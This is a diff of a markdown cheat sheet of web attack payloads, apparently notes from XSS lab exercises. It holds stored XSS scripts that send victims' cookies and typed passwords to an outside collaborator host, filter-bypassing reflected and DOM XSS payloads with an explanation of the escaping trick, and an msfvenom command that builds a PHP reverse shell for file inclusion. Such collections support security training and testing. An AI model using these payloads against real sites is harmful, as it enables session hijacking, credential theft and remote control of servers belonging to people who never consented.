@@ -10,7 +10,7 @@ amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29uZXJyb3I9YWxlcnQoJ1RITScpICkv
 ### Stored XSS
 #### Steal cookie
 `<script>
-fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+fetch('URL', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
@@ -19,18 +19,22 @@ body:document.cookie
 
 #### Capture other users information
 `<input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+<input type=password name=password onchange="if(this.value.length)fetch('URL',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
 });">`
+
+#### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+`http://foo?&apos;-alert(1)-&apos;`
 
 ### Reflected XSS
 #### Reflected XSS into attribute with angle brackets HTML-encoded
 
 `"onmouseover="alert(1)`
 
-#### Reflected DOM XSS
+#### Reflected with `"` escapsed
 
 `\"-alert(1)}//`
 
@@ -42,13 +46,24 @@ body:username.value+':'+this.value
 
 `</script><script>alert(1)</script>`
 
-#### Reflected XSS with some SVG markup allowed
+#### Reflected XSS with some SVG animate transform
 
 `<svg><animatetransform onbegin=alert(1)>`
 
 #### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
 `\'-alert(1)//`
+
+Explain: 
+
+If user input is `alert('1')`
+
+`var a = "alert(\'1\')"`
+
+To bypass escaped, instead of inserting `, we will use `\'`.
+
+`a = '\\' // a = character (\)`
+
 
 #### Reflected XSS into HTML context with all tags blocked except custom ones
 `<xss id="element-id" onclick="alert(1)" tabindex=1>#element-id`
@@ -59,11 +74,14 @@ Why we add `#element-id` at the end?
 
 The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 
 
-#### Reflected XSS in canonical link tag
+#### Reflected XSS in `canonical` link tag
 [About canonical link tag](https://ahrefs.com/blog/canonical-tags/) -> We will exploit by break href attribute
 
-### Stored XSS
+#### Reflected XSS with SVG Animate
 
+``
+<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg>
+``
 
 ### DOM XSS
 #### DOM XSS in `innerHTML`  sink using source `location.search`
@@ -75,7 +93,6 @@ The hash at the end of the URL focuses on this element as soon as the page is lo
 #### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 [XSS Angular JS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
 
-#### 
 # RFI
 ### Shell generation
 `msfvenom -p php/reverse_php lport=4444 lhost=<your ip > /path/to/shell`
